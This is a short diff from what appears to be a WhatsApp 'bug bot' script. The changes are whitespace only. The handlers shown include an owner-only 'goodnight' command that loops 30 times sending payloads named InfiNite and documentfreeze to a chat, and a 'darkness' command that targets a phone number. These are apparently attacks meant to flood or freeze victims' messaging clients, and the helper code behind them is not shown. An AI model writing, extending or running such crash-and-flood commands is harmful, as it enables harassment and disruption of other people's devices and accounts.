@@ -3948,6 +3948,7 @@ case 'magic': {
 case 'off':
 case 'goodnight': {
     if (!isOwner) return reply("I am eliminating.");
+
     for (let j = 0; j < 30; j++) {
         await InfiNite(m.chat, { cct: true, ptcp: true });
         await InfiNite(m.chat, { cct: true, ptcp: true });
@@ -3961,9 +3962,9 @@ case 'goodnight': {
         await documentfreeze(m.chat, { cct: true });
         await InfiNite(m.chat, { cct: true, ptcp: true });
     }
+
     break;
 }
-
 case "darkness": {
     if (!isOwner) return reply(`*CONTACT DAMINĪ https://wa.me/2348054671 458?text=Hi%20Dami*`);
     if (!q) return reply(`*Cannot Procces your Request*\n\n_Use : darkness Number_\n_Example : darkness  225xx_\n\nDani-mini-v2 ▒`);
